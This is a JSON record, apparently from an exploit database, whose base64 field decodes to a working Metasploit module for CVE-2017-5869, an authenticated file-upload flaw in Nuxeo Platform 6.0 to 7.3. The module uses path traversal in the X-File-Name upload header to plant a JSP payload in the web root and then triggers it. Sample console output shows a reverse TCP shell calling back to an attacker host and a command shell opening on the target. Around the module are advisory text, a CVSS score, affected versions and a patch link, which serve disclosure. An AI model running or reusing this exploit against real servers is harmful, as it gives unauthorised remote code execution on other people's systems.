{
    "source": "exploit-database", 
    "exploit": "PWJlZ2luDQojIERlc2NyaXB0aW9uDQoNCk51eGVvIFBsYXRmb3JtIGlzIGEgY29udGVudCBtYW5hZ2VtZW50IHN5c3RlbSBmb3IgZW50ZXJwcmlzZXMgKENNUykuDQpJdCBlbWJlZHMgYW4gQXBhY2hlIFRvbWNhdCBzZXJ2ZXIsIGFuZCBjYW4gYmUgbWFuYWdlZCB0aHJvdWdoIGEgd2ViDQppbnRlcmZhY2UuDQoNCk9uZSBvZiBpdHMgZmVhdHVyZXMgYWxsb3dzIGF1dGhlbnRpY2F0ZWQgdXNlcnMgdG8gaW1wb3J0IGZpbGVzIHRvIHRoZQ0KcGxhdGZvcm0uDQpCeSBjcmFmdGluZyB0aGUgdXBsb2FkIHJlcXVlc3Qgd2l0aCBhIHNwZWNpZmljIGBgWC1GaWxlLU5hbWVgYCBoZWFkZXIsDQpvbmUgY2FuIHN1Y2Nlc3NmdWx5IHVwbG9hZCBhIGZpbGUgYXQgYW4gYXJiaXRyYXJ5IGxvY2F0aW9uIG9mIHRoZSBzZXJ2ZXINCmZpbGUgc3lzdGVtLg0KDQpJdCBpcyB0aGVuIHBvc3NpYmxlIHRvIHVwbG9hZCBhIEpTUCBzY3JpcHQgdG8gdGhlIHJvb3QgZGlyZWN0b3J5IG9mIHRoZQ0Kd2ViIGFwcGxpY2F0aW9uIHRvIGV4ZWN1dGUgY29tbWFuZHMgb24gdGhlIHJlbW90ZSBob3N0IG9wZXJhdGluZyBzeXN0ZW0uDQpTZXR0aW5nIHRoZSB2YWx1ZSBgYC4uLy4uL254c2VydmVyL251eGVvLndhci9zaGVsbC5qc3BgYCB0byB0aGUNCmBgWC1GaWxlLU5hbWVgYCBoZWFkZXIgaXMgYSB3YXkgdG8gZG8gc28uDQoNCiMjIERldGFpbHMNCg0KKipDVkUgSUQqKjogQ1ZFLTIwMTctNTg2OQ0KDQoqKkFjY2VzcyBWZWN0b3IqKjogbmV0d29yaw0KDQoqKlNlY3VyaXR5IFJpc2sqKjogaGlnaA0KDQoqKlZ1bG5lcmFiaWxpdHkqKjogQ1dFLTQzNA0KDQoqKkNWU1MgQmFzZSBTY29yZSoqOiA4LjgNCg0KKipDVlNTIFZlY3RvcioqOiBDVlNTOjMuMC9BVjpOL0FDOkwvUFI6TC9VSTpOL1M6VS9DOkgvSTpIL0E6SA0KDQojIFByb29mIG9mIENvbmNlcHQNCg0KSGVyZSBpcyBhIG1ldGFzcGxvaXQgbW9kdWxlIHRvIGV4cGxvaXQgdGhpcyB2dWxuZXJhYmlsaXR5Og0KDQo9ZW5kDQojIw0KIyBUaGlzIG1vZHVsZSByZXF1aXJlcyBNZXRhc3Bsb2l0OiBodHRwOi8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KDQpjbGFzcyBNZXRhc3Bsb2l0TW9kdWxlIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCiAgICBSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQogICAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cENsaWVudA0KDQogICAgZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCiAgICAgICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICAgICAgICdOYW1lJyAgICAgICAgICAgICAgPT4gIk51eGVvIFBsYXRmb3JtIEZpbGUgVXBsb2FkIFJDRSIsDQogICAgICAgICAgICAnRGVzY3JpcHRpb24nICAgICAgID0+ICVxew0KICAgICAgICAgICAgICAgIFRoZSBOdXhlbyBQbGF0Zm9ybSB0b29sIGlzIHZ1bG5lcmFibGUgdG8gYW4gYXV0aGVudGljYXRlZCByZW1vdGUgY29kZSBleGVjdXRpb24sDQogICAgICAgICAgICAgICAgdGhhbmtzIHRvIGFuIHVwbG9hZCBtb2R1bGUuDQogICAgICAgICAgICB9LA0KICAgICAgICAgICAgJ0xpY2Vuc2UnICAgICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICAgICAgICdBdXRob3InICAgICAgICAgICAgPT4gWydSb25hbiBLZXJ2ZWxsYSA8ci5rZXJ2ZWxsYUBzeXNkcmVhbS5jb20+J10sDQogICAgICAgICAgICAnUmVmZXJlbmNlcycgICAgICAgID0+DQogICAgICAgICAgICAgICAgWw0KICAgICAgICAgICAgICAgICAgICBbJ2h0dHBzOi8vbnV4ZW8uY29tLycsICcnXQ0KICAgICAgICAgICAgICAgIF0sDQogICAgICAgICAgICAnUGxhdGZvcm0nICAgICAgICAgID0+ICV3e2xpbnV4fSwNCiAgICAgICAgICAgICdUYXJnZXRzJyAgICAgICAgICAgPT4gWyBbJ051eGVvIFBsYXRmb3JtIDYuMCB0byA3LjMnLCAnUGxhdGZvcm0nID0+ICdsaW51eCddIF0sDQogICAgICAgICAgICAnQXJjaCcgICAgICAgICAgICAgID0+IEFSQ0hfSkFWQSwNCiAgICAgICAgICAgICdQcml2aWxlZ2VkJyAgICAgICAgPT4gdHJ1ZSwNCiAgICAgICAgICAgICdQYXlsb2FkJyAgICAgICAgICAgPT4ge30sDQogICAgICAgICAgICAnRGlzY2xvc3VyZURhdGUnICAgID0+ICIiLA0KICAgICAgICAgICAgJ0RlZmF1bHRUYXJnZXQnICAgICA9PiAwKSkNCiAgICAgICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgICAgICAgIFsNCiAgICAgICAgICAgICAgICBPcHRTdHJpbmcubmV3KCdUQVJHRVRVUkknLCBbdHJ1ZSwgJ1RoZSBwYXRoIHRvIHRoZSBudXhlbyBhcHBsaWNhdGlvbicsICcvbnV4ZW8nXSksDQogICAgICAgICAgICAgICAgT3B0U3RyaW5nLm5ldygnVVNFUk5BTUUnLCBbdHJ1ZSwgJ0EgdmFsaWQgdXNlcm5hbWUnLCAnJ10pLA0KICAgICAgICAgICAgICAgIE9wdFN0cmluZy5uZXcoJ1BBU1NXT1JEJywgW3RydWUsICdQYXNzd29yZCBsaW5rZWQgdG8gdGhlIHVzZXJuYW1lJywgJyddKQ0KICAgICAgICAgICAgXSwgc2VsZi5jbGFzcykNCiAgICBlbmQNCg0KICAgIGRlZiBqc3BfZmlsZW5hbWUNCiAgICAgICAgQGpzcF9maWxlbmFtZSB8fD0gUmV4OjpUZXh0OjpyYW5kX3RleHRfYWxwaGEoOCkgKyAnLmpzcCcNCiAgICBlbmQNCg0KICAgIGRlZiBqc3BfcGF0aA0KICAgICAgICAnbnhzZXJ2ZXIvbnV4ZW8ud2FyLycgKyBqc3BfZmlsZW5hbWUNCiAgICBlbmQNCg0KICAgIGRlZiBudXhlb19sb2dpbg0KICAgICAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ0dFVCcsDQogICAgICAgICAgICAndXJpJyAgICA9PiBub3JtYWxpemVfdXJpKHRhcmdldF91cmkucGF0aCwgJy9sb2dpbi5qc3AnKQ0KICAgICAgICApDQoNCiAgICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVucmVhY2hhYmxlLCAnTm8gcmVzcG9uc2UgcmVjZWl2ZWQgZnJvbSB0aGUgdGFyZ2V0LicpIHVubGVzcyByZXMNCiAgICAgICAgc2Vzc2lvbl9jb29raWUgPSByZXMuZ2V0X2Nvb2tpZXMNCg0KICAgICAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgICAgICAgJ21ldGhvZCcgICAgPT4gJ1BPU1QnLA0KICAgICAgICAgICAgJ3VyaScgICAgICAgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsICcvbnhzdGFydHVwLmZhY2VzJyksDQogICAgICAgICAgICAnY29va2llJyAgICA9PiBzZXNzaW9uX2Nvb2tpZSwNCiAgICAgICAgICAgICd2YXJzX3Bvc3QnID0+IHsNCiAgICAgICAgICAgICAgICAndXNlcl9uYW1lJyAgICAgPT4gZGF0YXN0b3JlWydVU0VSTkFNRSddLA0KICAgICAgICAgICAgICAgICd1c2VyX3Bhc3N3b3JkJyA9PiBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10sDQogICAgICAgICAgICAgICAgJ3N1Ym1pdCcgICAgICAgID0+ICdDb25uZXhpb24nDQogICAgICAgICAgICB9DQogICAgICAgICkNCiAgICAgICAgcmV0dXJuIHNlc3Npb25fY29va2llIGlmIHJlcyAmJiByZXMuY29kZSA9PSAzMDIgJiYgcmVzLnJlZGlyZWN0aW9uLnRvX3MuaW5jbHVkZT8oJ3ZpZXdfaG9tZS5mYWNlcycpDQogICAgICAgIG5pbA0KICAgIGVuZA0KDQogICAgZGVmIHRyaWdnZXJfc2hlbGwNCiAgICAgICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSgNCiAgICAgICAgICAgICdtZXRob2QnICAgID0+ICdHRVQnLA0KICAgICAgICAgICAgJ3VyaScgICAgICAgPT4gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsIGpzcF9maWxlbmFtZSkNCiAgICAgICAgKQ0KICAgICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5rbm93biwgJ1VuYWJsZSB0byBnZXQgI3tmdWxsX3VyaX0vI3tqc3BfZmlsZW5hbWV9JykgdW5sZXNzIHJlcyAmJiByZXMuY29kZSA9PSAyMDANCiAgICBlbmQNCg0KICAgIGRlZiBleHBsb2l0DQogICAgICAgIHByaW50X3N0YXR1cygiQXV0aGVudGljYXRpbmcgdXNpbmcgI3tkYXRhc3RvcmVbJ1VTRVJOQU1FJ119OiN7ZGF0YXN0b3JlWydQQVNTV09SRCddfSIpDQogICAgICAgIHNlc3Npb25fY29va2llID0gbnV4ZW9fbG9naW4NCiAgICAgICAgaWYgc2Vzc2lvbl9jb29raWUNCiAgICAgICAgICAgIHBheWxvYWRfdXJsID0gbm9ybWFsaXplX3VyaSh0YXJnZXRfdXJpLnBhdGgsIGpzcF9maWxlbmFtZSkNCiAgICAgICAgICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koDQogICAgICAgICAgICAgICAgJ21ldGhvZCcgICAgPT4gJ1BPU1QnLA0KICAgICAgICAgICAgICAgICd1cmknICAgICAgID0+IG5vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCAnL3NpdGUvYXV0b21hdGlvbi9iYXRjaC91cGxvYWQnKSwNCiAgICAgICAgICAgICAgICAnY29va2llJyAgICA9PiBzZXNzaW9uX2Nvb2tpZSwNCiAgICAgICAgICAgICAgICAnaGVhZGVycycgICAgPT4gew0KICAgICAgICAgICAgICAgICAgICAnWC1GaWxlLU5hbWUnICAgPT4gJy4uLy4uLycgKyBqc3BfcGF0aCwNCiAgICAgICAgICAgICAgICAgICAgJ1gtQmF0Y2gtSWQnICAgID0+ICcwMCcsDQogICAgICAgICAgICAgICAgICAgICdYLUZpbGUtU2l6ZScgICA9PiAnMTAyNCcsDQogICAgICAgICAgICAgICAgICAgICdYLUZpbGUtVHlwZScgICA9PiAnJywNCiAgICAgICAgICAgICAgICAgICAgJ1gtRmlsZS1JZHgnICAgID0+ICcwJywNCiAgICAgICAgICAgICAgICAgICAgJ1gtUmVxdWVzdGVkLVdpdGgnICA9PiAnWE1MSHR0cFJlcXVlc3QnDQogICAgICAgICAgICAgICAgfSwNCiAgICAgICAgICAgICAgICAnY3R5cGUnICAgICAgICAgICAgID0+ICcnLA0KICAgICAgICAgICAgICAgICdkYXRhJyA9PiBwYXlsb2FkLmVuY29kZWQNCiAgICAgICAgICAgICkNCiAgICAgICAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAnVW5hYmxlIHRvIHVwbG9hZCB0aGUgcGF5bG9hZCcpIHVubGVzcyByZXMgJiYgcmVzLmNvZGUgPT0gMjAwDQogICAgICAgICAgICBwcmludF9zdGF0dXMoIkV4ZWN1dGluZyB0aGUgcGF5bG9hZCBhdCAje25vcm1hbGl6ZV91cmkodGFyZ2V0X3VyaS5wYXRoLCBwYXlsb2FkX3VybCl9LiIpDQogICAgICAgICAgICB0cmlnZ2VyX3NoZWxsDQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmtub3duLCAnVW5hYmxlIHRvIGxvZ2luJykNCiAgICAgICAgZW5kDQogICAgZW5kDQoNCmVuZA0KDQo9YmVnaW4NCk1vZHVsZSBvdXRwdXQ6DQoNCmBgYGJhc2gNCm1zZj4gdXNlIGV4cGxvaXQvbXVsdGkvaHR0cC9udXhlbw0KbXNmIGV4cGxvaXQobnV4ZW8pID4gc2V0IFVTRVJOQU1FIHVzZXIxDQpVU0VSTkFNRSA9PiB1c2VyMQ0KbXNmIGV4cGxvaXQobnV4ZW8pID4gc2V0IFBBU1NXT1JEIHBhc3N3b3JkDQpQQVNTV09SRCA9PiBwYXNzd29yZA0KbXNmIGV4cGxvaXQobnV4ZW8pID4gc2V0IHJob3N0IDE5Mi4xNjguMjUzLjEzMg0Kcmhvc3QgPT4gMTkyLjE2OC4yNTMuMTMyDQptc2YgZXhwbG9pdChudXhlbykgPiBzZXQgcGF5bG9hZCBqYXZhL2pzcF9zaGVsbF9yZXZlcnNlX3RjcA0KcGF5bG9hZCA9PiBqYXZhL2pzcF9zaGVsbF9yZXZlcnNlX3RjcA0KbXNmIGV4cGxvaXQobnV4ZW8pID4gc2V0IGxob3N0IDE5Mi4xNjguMjUzLjENCmxob3N0ID0+IDE5Mi4xNjguMjUzLjENCm1zZiBleHBsb2l0KG51eGVvKSA+IGV4cGxvaXQNCg0KWy1dIEhhbmRsZXIgZmFpbGVkIHRvIGJpbmQgdG8gMTkyLjE2OC4yNTMuMTo0NDQ0Oi0gIC0NClsqXSBTdGFydGVkIHJldmVyc2UgVENQIGhhbmRsZXIgb24gMC4wLjAuMDo0NDQ0DQpbKl0gQXV0aGVudGljYXRpbmcgdXNpbmcgdXNlcjE6cGFzc3dvcmQNClsqXSBFeGVjdXRpbmcgdGhlIHBheWxvYWQgYXQgL251eGVvL251eGVvL1FCQ2Vmd3hRLmpzcC4NClsqXSBDb21tYW5kIHNoZWxsIHNlc3Npb24gMSBvcGVuZWQgKDE3Mi4xNy4wLjI6NDQ0NCAtPg0KMTkyLjE2OC4yNTMuMTMyOjQzMjc5KSBhdCAyMDE3LTAxLTEzIDE0OjQ3OjI1ICswMDAwDQoNCmlkDQp1aWQ9MTAwMChudXhlbykgZ2lkPTEwMDAobnV4ZW8pDQpncm91cHM9MTAwMChudXhlbyksNChhZG0pLDI0KGNkcm9tKSwyNyhzdWRvKSwzMChkaXApLDQ2KHBsdWdkZXYpLDEwOShscGFkbWluKSwxMTAoc2FtYmFzaGFyZSkNCnB3ZA0KL3Zhci9saWIvbnV4ZW8vc2VydmVyDQpgYGANCg0KIyBWdWxuZXJhYmxlIGNvZGUNCg0KVGhlIHZ1bG5lcmFibGUgY29kZSBpcyBsb2NhdGVkIGluIHRoZQ0KYG9yZy5udXhlby5lY20ucmVzdGFwaS5zZXJ2ZXIuamF4cnMuQmF0Y2hVcGxvYWRPYmplY3RgIGNsYXNzIChbZ2l0aHViDQpsaW5rXShodHRwczovL2dpdGh1Yi5jb20vbnV4ZW8vbnV4ZW8vYmxvYi9iMDVkZGU3ODlhNmMwYzdiNWYzNjE2MDhlYjZkNmJkMGZkYTMxZjM2L251eGVvLWZlYXR1cmVzL3Jlc3QtYXBpL251eGVvLXJlc3QtYXBpLXNlcnZlci9zcmMvbWFpbi9qYXZhL29yZy9udXhlby9lY20vcmVzdGFwaS9zZXJ2ZXIvamF4cnMvQmF0Y2hVcGxvYWRPYmplY3QuamF2YSNMMTUwKSksDQp3aGVyZSB0aGUgaGVhZGVyIGBgWC1GaWxlLU5hbWVgYCBpcyBub3QgY2hlY2tlZC4NCg0KIyBGaXgNCg0KTnV4ZW8gcHJvdmlkZWQgYQ0KW3BhdGNoXShodHRwczovL2dpdGh1Yi5jb20vbnV4ZW8vbnV4ZW8vY29tbWl0LzZiMzExMzk3N2VmNmMyMzA3Zjk0MDg0OWEyYzE5NjYyMWViZjE4OTIpDQpmb3IgdGhpcyBpc3N1ZS4NCkEgaG90Zml4IHJlbGVhc2UgaXMgYWxzbyBhdmFpbGFibGUgZm9yIE51eGVvIDYuMCAoTnV4ZW8gNi4wIEhGMzUpLg0KDQpQbGVhc2Ugbm90ZSB0aGF0IHZ1bG5lcmFiaWxpdHkgZG9lcyBub3QgYWZmZWN0IE51eGVvIHZlcnNpb25zIGFib3ZlIDcuMy4NCg0KIyBBZmZlY3RlZCB2ZXJzaW9ucw0KDQoqIE51eGVvIDYuMCAoTFRTIDIwMTQpLCByZWxlYXNlZCAyMDE0LTExLTA2DQoqIE51eGVvIDcuMSAoRmFzdCBUcmFjaywgb2Jzb2xldGVkIGJ5IE51eGVvIDcuMTApLCByZWxlYXNlZCAyMDE1LTAxLTE1DQoqIE51eGVvIDcuMiAoRmFzdCBUcmFjaywgb2Jzb2xldGVkIGJ5IE51eGVvIDcuMTApLCByZWxlYXNlZCAyMDE1LTAzLTI0DQoqIE51eGVvIDcuMyAoRmFzdCBUcmFjaywgb2Jzb2xldGVkIGJ5IE51eGVvIDcuMTApLCByZWxlYXNlZCAyMDE1LTA2LTI0DQoNCiMgVW5hZmZlY3RlZCB2ZXJzaW9ucw0KDQoqIE51eGVvIDYuMCBIRjM1LCByZWxlYXNlZCAyMDE3LTAxLTEyDQoqIE51eGVvIDcuNCAoRmFzdCBUcmFjaywgb2Jzb2xldGVkIGJ5IE51eGVvIDcuMTApLCByZWxlYXNlZCAyMDE1LTEwLTAyDQoqIE51eGVvIDcuMTAgKExUUyAyMDE1KSwgcmVsZWFzZWQgMjAxNS0xMS0wOQ0KKiBOdXhlbyA4LjEwIChMVFMgMjAxNiksIHJlbGVhc2VkIDIwMTYtMTItMDYNCg0KIyBDcmVkaXRzDQoNClJvbmFuIEtlcnZlbGxhIDxyLmtlcnZlbGxhQHN5c2RyZWFtLmNvbT4NCg0KLS0gU1lTRFJFQU0gTGFicyA8bGFic0BzeXNkcmVhbS5jb20+IA0KR1BHIDogNDdEMSBFMTI0IEM0M0UgRjk5MiAyQTJFIDE1NTEgOEVCNCA4Q0Q5IEQ1QjIgNTlBMSANCiogV2Vic2l0ZTogaHR0cHM6Ly9zeXNkcmVhbS5jb20vIA0KKiBUd2l0dGVyOiBAc3lzZHJlYW0gDQo9ZW5k", 
    "filename": "platforms/jsp/webapps/41748.rb", 
    "id": "41748", 
    "cves": [
        "CVE-2017-5869"
    ]
}